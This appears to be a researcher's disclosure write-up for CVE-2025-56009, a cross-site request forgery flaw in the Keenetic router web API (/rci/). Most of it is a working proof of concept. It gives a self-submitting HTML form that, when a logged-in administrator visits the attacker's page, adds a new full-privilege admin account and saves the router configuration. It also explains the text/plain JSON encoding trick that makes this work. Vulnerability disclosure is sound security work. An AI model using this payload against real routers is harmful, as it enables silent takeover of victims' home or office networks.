## CVE-2025-56009

### Some notes

Well, this is a simple CSRF vulnerability. There were no any CSRF protections (and `Content-Type` was not validated), so the main challenge was keeping the request body valid JSON while the `Content-Type` was `text/plain`. Since this is the only API route the router sends requests to, it was very easy to find this vulnerability.

### Exploitation

Exploitation for this vulnerability is standart: we need to create an auto-submitting form on our site pointing to the vulnerable endpoint:

```html
<html>
    <body>
        <form
            action="https://XXX.keenetic.name/rci/"
            method="POST"
            enctype="text/plain"
        >
            <input
                type="hidden"
                name='&#91;&#123;"user"&#58;&#123;"name"&#58;"test"&#44;"tag"&#58;&#91;&#123;"tag"&#58;"cli"&#44;"no"&#58;false&#125;&#44;&#123;"tag"&#58;"http"&#44;"no"&#58;false&#125;&#44;&#123;"tag"&#58;"readonly"&#44;"no"&#58;false&#125;&#44;&#123;"tag"&#58;"ipsec&#45;l2tp"&#44;"no"&#58;false&#125;&#44;&#123;"tag"&#58;"ipsec&#45;xauth"&#44;"no"&#58;false&#125;&#44;&#123;"tag"&#58;"http&#45;proxy"&#44;"no"&#58;false&#125;&#44;&#123;"tag"&#58;"opt"&#44;"no"&#58;false&#125;&#93;&#44;"password"&#58;"123"&#125;&#125;&#44;&#123;"system"&#58;&#123;"configuration"&#58;&#123;"save"&#58;&#123;&#125;&#125;&#125;,"1'
                value='1":1}&#93;'
            />
            <input type="submit" value="Submit request" />
        </form>
        <script>
            history.pushState("", "", "/");
            document.forms[0].submit();
        </script>
    </body>
</html>
```

When a victim visits the page, the browser submits the form and sends the POST request to `/rci/` endpoint, adding a new admin user:

```
POST /rci/ HTTP/1.1
Host: XXX.keenetic.name
Cookie: <cookie>
Content-Length: 305
...
Content-Type: text/plain
...

[{"user":{"name":"test","tag":[{"tag":"cli","no":false},{"tag":"http","no":false},{"tag":"readonly","no":false},{"tag":"ipsec-l2tp","no":false},{"tag":"ipsec-xauth","no":false},{"tag":"http-proxy","no":false},{"tag":"opt","no":false}],"password":"test_pass"}},{"system":{"configuration":{"save":{}}},"1=1":1}]
```

Of course, we need to know the admin panel URl (may be local, `192.168.0.1`, or global, `XXX.keenetic.name`).

Note the `{"1=1":1}` trick here: it preserves both valid JSON structure and the POST body structure simultaneously while using `text/plain`.

### Additional

As I said earlier, targets like routers make good targets for searching of web vulrenabilities: they're often overlooked, but flaws in them can have an impact, as in this case.

### Links

-   CVE record: https://www.cve.org/CVERecord?id=CVE-2025-56009
-   Keenetic security advisory: https://keenetic.com/global/security#october-2025-web-api-vulnerabilities
